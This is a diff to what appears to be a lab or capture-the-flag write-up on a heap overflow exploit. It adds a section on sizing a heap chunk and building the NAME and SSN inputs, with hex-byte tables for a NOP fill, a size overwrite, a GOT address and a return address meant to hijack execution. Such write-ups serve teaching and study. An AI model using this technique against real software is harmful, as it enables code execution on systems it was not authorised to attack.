@@ -83,5 +83,25 @@ Since we have access to the source code, it is quite trivial to determine the le
 | Prefix          | 8                  |
 | NOP JMP         | 8                  |
 | Overwrite       | 4                  |
-| Shellcode       | 46                 |
-| **Total**       | **66**               |
+| Shellcode       | 45                 |
+| **Total**       | **65**             |
+
+Since chunks are allocated in increments of 8 bytes, the chunk will have a total of 88 bytes (`ceil((65 + 17) / 8) * 8`), including 8 bytes of metadata at the beginning. Then we need a total of `88 - 8 - 65 = 15` bytes of additional input to fill the buffer. The character `:` is concatenated, so we need 14 bytes at the beginning of `SSN` to fill the buffer. 
+
+## Building the exploit
+The name argument is generated as follows, where `+` indicates concatenation:
+```
+NAME = Prefix + NOP_JMP + Overwrite + Shellcode
+```
+
+As mentioned in the previous section, we need an additional 14 bytes to fill the buffer, and for that we shall use NOPs. The size of the next chunk is 16 bytes (10 declared, but allocated in blocks of 8), so we need to overwrite the initial 8 bytes of metadata with `0xFFFFFFFF`, place the GOT address - 12, followed by the address of `jmp 0x6` - 6. Thus the `SSN` input is composed as follows:
+| Component | Data |
+| :------:  | ---- |
+| NOP_FILL | `\x90` * 14 |
+| SIZE    | `\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF` |
+| GOT_ADDR | `\x24\x9d\x04\x08` |
+| RET_ADDR | `\xd0\x93\x04\x08` |
+
+```
+SSN = NOP_FILL + SIZE + GOT_ADDR + RET_ADDR
+```
